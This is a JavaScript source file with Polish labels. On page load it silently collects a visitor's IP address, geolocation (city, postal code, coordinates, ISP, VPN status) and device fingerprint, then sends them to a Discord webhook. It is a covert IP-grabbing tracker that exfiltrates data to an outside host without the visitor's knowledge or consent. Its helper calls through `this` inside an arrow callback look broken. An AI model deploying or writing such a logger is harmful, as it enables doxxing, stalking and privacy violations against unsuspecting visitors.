document.addEventListener('DOMContentLoaded', async () => {
    if (!window.CONFIG?.DISCORD_WEBHOOK) {
        console.error("Brak skonfigurowanego webhooka Discord!");
        return;
    }

    try {
        // 1. Pobierz podstawowe dane
        const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
        const ip = ipData.ip;

        // 2. Pobierz pełne dane geolokalizacyjne
        const locationData = await this._fetchWithFallback([
            `https://ipapi.co/${ip}/json/`,
            `https://ipwho.is/${ip}`
        ]);

        // 3. Zbierz dane o urządzeniu
        const deviceData = this._getDeviceData();

        // 4. Przygotuj embed Discord
        const embed = {
            title: "📊 Pełne dane użytkownika",
            color: 0x00ff00,
            fields: [
                {
                    name: "🌍 Lokalizacja",
                    value: this._formatLocation(locationData),
                    inline: true
                },
                {
                    name: "📱 Urządzenie",
                    value: this._formatDevice(deviceData),
                    inline: true
                },
                {
                    name: "🌐 Sieć",
                    value: this._formatNetwork(ip, locationData),
                    inline: false
                }
            ],
            footer: {
                text: `Czas: ${new Date().toLocaleString("pl-PL")}`
            }
        };

        // 5. Wyślij do Discord
        await this._sendToDiscord(embed);
        
    } catch (error) {
        console.error("Błąd loggera:", error);
    }
});

// Metody pomocnicze:

async function _fetchWithFallback(urls) {
    for (const url of urls) {
        try {
            const response = await fetch(url);
            if (response.ok) return await response.json();
        } catch (e) {
            console.log(`Błąd przy ${url}:`, e);
        }
    }
    return {};
}

function _getDeviceData() {
    return {
        // System
        os: navigator.platform,
        userAgent: navigator.userAgent,
        
        // Ekran
        screen: `${window.screen.width}x${window.screen.height}`,
        colorDepth: `${window.screen.colorDepth}-bit`,
        orientation: window.screen.orientation?.type || 'unknown',
        
        // Urządzenie
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'unknown',
        touchSupport: navigator.maxTouchPoints > 0,
        
        // Typ urządzenia
        isMobile: /Android|iPhone|iPad/i.test(navigator.userAgent),
        isBot: navigator.webdriver || false
    };
}

function _formatLocation(data) {
    return `
    **Kraj:** ${data.country || data.country_name || 'Nieznany'}
    **Miasto:** ${data.city || 'Nieznane'}
    **Region:** ${data.region || data.region_name || 'Nieznany'}
    **Kod pocztowy:** ${data.postal || 'Nieznany'}
    **Współrzędne:** ${data.latitude || '?'}, ${data.longitude || '?'}
    **Strefa czasowa:** ${data.timezone || 'Nieznana'}
    `;
}

function _formatDevice(data) {
    return `
    **System:** ${data.os}
    **Typ:** ${data.isMobile ? 'Mobilne' : 'Desktop'}
    **Ekran:** ${data.screen}
    **Pamięć:** ${data.deviceMemory}
    **Rdzenie:** ${data.cpuCores}
    **Touch:** ${data.touchSupport ? 'Tak' : 'Nie'}
    `;
}

function _formatNetwork(ip, data) {
    return `
    **IP:** ${ip}
    **ISP:** ${data.org || data.connection?.isp || 'Nieznany'}
    **ASN:** ${data.asn || 'Nieznany'}
    **VPN/Proxy:** ${data.security?.vpn || data.security?.proxy ? 'Tak' : 'Nie'}
    **Hosting:** ${data.security?.hosting ? 'Tak' : 'Nie'}
    `;
}

async function _sendToDiscord(embed) {
    try {
        const response = await fetch(window.CONFIG.DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] })
        });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
    } catch (error) {
        console.error("Błąd wysyłania do Discord:", error);
        throw error;
    }
}
